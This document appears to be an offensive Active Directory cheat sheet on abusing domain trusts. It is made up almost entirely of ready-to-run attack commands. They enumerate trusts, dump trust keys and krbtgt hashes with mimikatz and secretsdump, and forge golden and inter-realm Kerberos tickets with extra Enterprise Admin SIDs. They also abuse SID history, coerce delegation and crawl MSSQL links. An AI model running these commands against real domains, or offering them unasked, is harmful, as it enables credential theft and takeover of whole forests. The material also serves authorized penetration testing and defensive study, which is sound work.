# Trusts

## Enumeration
- `nltest.exe /trusted_domains`
- `([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()`
- `Get-DomainTrust -Domain <domain>`
- `Get-DomainTrustMapping`
- `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> trusts`
- `sharphound.exe -c trusts -d <domain>`
  - `MATCH p=(:Domain)-[:TrustedBy]->(:Domain) RETURN p`
- Get Domains SID
  - `Get-DomainSID -Domain <domain> Get-DomainSID -Domain <target_domain>` 
  - `lookupsid.py -domain-sids <domain>/<user>:<password>'@<dc> 0 lookupsid.py -domain-sids <domain>/<user>:<password>'@<target_dc> 0`

## Child->Parent
- Trust Key >>> PassTheTicket
  - `mimikatz lsadump::trust /patch`
    - `mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /aes256:<trust_key_aes256> /sids:<target_domain_sid>-519 /service:krbtgt /target:<target_domain> /ptt`
  - `secretsdump.py -just-dc-user '<parent_domain>$'   <domain>/<user>:<password>@<dc_ip>`
    - `ticketer.py -nthash <trust_key> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 -spn krbtgt/<parent_domain> trustfakeuser`

- Golden Ticket >>> PassTheTicket
  - `mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt`
    - `mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID-519> /ptt`
  - `raiseChild.py <child_domain>/<user>:<password>`
  - `ticketer.py -nthash <child_krbtgt_hash> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 goldenuser`

- Unconstrained delegation
  - coerce parent_dc on child_dc domain >>> unconstrained delegation

## Parent->Child
- same as Child to parent

## External Trust 
- DomainA <--> DomainB trust (B trust A, A trust B)
  - from A to B FOREST_TRANSITIVE
    - password reuse >>> lat move (creds/pth/...)
    - Foreign group and users >>> ACL
      - Users with foreign Domain Group Membership
        - `MATCH p=(n:User {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p`
      - Group with foreign Domain Group Membership
        - `MATCH p=(n:Group {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p`
    - SID History on B >>> PassTheTicket
      - Golden ticket
        - `mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt`
          - `mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-<GROUP_SID_SUP_1000> /ptt`
        - `ticketer.py -nthash <krbtgt> -domain-sid <domain_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid sup 1000> fakeuser`
      - Trust ticket
        - `secretsdump.py -just-dc-user '<domainB>' <domainA>/<user>:'<password>'@<dc_a>`
          - `ticketer.py -nthash <trust_hash> -domain-sid <sid_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid sup 1000> -spn krbtgt/<domain_a> fakeuser`
    - ADCS abuse >>> ADCS
  - from A to B is FOREST_TRANSITIVE|TREAT_AS_EXTERNAL
      - Unconstrained delegation
        - coerce dc_b on dc_a >>> unconstrained delegation
        
- DomainA <-- DomainB trust (B trust A / A access B)
  - Same as double trust, but no unconstrained delegation as B can't connect to A

- DomainA --> DomainB trust (A trust B / B access A)
  - password reuse >>> lat move (creds/pth/...)

## Mssql links >>> MSSQL
- MSSQL trusted links doesn't care of trust link
  - `Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance>`
  - `mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>`
    - trustlink
      - sp_linkedservers
        - use_link